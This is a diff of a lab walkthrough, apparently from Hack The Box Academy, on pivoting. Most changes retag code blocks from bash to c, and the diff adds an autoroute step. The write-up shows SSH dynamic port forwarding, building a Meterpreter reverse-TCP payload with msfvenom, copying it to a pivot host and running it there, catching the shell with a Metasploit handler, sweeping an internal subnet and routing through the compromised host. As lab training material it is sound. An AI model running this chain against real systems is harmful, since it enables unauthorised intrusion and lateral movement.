@@ -139,12 +139,12 @@ When setting up a listener (e.g., for a reverse shell, Meterpreter handler, or a
 
 I connected to the SSH server using dynamic port forwarding with the following command:
 
-```bash
+```c
 ssh -D 9050 ubuntu@10.129.135.184
 ```
 Next, I generated a Meterpreter payload for the Ubuntu server using msfvenom:
 
-```bash
+```c
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.162 LPORT=8080 -f elf -o shell
 
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
@@ -157,7 +157,7 @@ Saved as: shell
 ```
 
 I ran the following command to copy the payload to the Ubuntu server using scp:
-```bash
+```c
 scp /home/htb-ac-1310789/shell ubuntu@10.129.135.184:/home/ubuntu
 
 ubuntu@10.129.135.184's password: 
@@ -165,7 +165,7 @@ shell                                                                           
 ```
 
 I then set up and started the multi/handler in Metasploit to listen for the reverse connection:
-```bash
+```c
 msfconsole -q
 [msf](Jobs:0 Agents:0) >> use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
@@ -182,21 +182,21 @@ payload => linux/x64/meterpreter/reverse_tcp
 
 After that I executed the payload on the pivot host with following commands:
 
-```bash 
+```c 
 ubuntu@WEB01:~$ ls
 shell
 ubuntu@WEB01:~$ chmod +x shell
 ubuntu@WEB01:~$ ./shell
 ```
 This successfully initiated the reverse TCP connection, and we received a Meterpreter session:
-```bash
+```c
 [*] Started reverse TCP handler on 0.0.0.0:8080 
 [*] Sending stage (3045380 bytes) to 10.129.135.184
 [*] Meterpreter session 1 opened (10.10.14.162:8080 -> 10.129.135.184:47350) at 2025-03-03 11:12:38 -0600
 ```
 
 After obtaining the Meterpreter session, I ran a ping sweep on the Ubuntu server to identify other live hosts in the network range:
-```bash
+```c
 Meterpreter 1)(/home/ubuntu) > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
 [*] Performing ping sweep for IP range 172.16.5.0/23
 [+] 172.16.5.19 host found
@@ -205,5 +205,13 @@ Meterpreter 1)(/home/ubuntu) > run post/multi/gather/ping_sweep RHOSTS=172.16.5.
 
 * **Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x)**
 
+To enable routing to the subnet 172.16.5.0/23 through the compromised pivot host, I used the following Meterpreter command:
 
+```c
+run autoroute -s 172.16.5.0/23
+```
+The output indicated that the route was successfully added:
 
+```c
+[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.135.184
+```
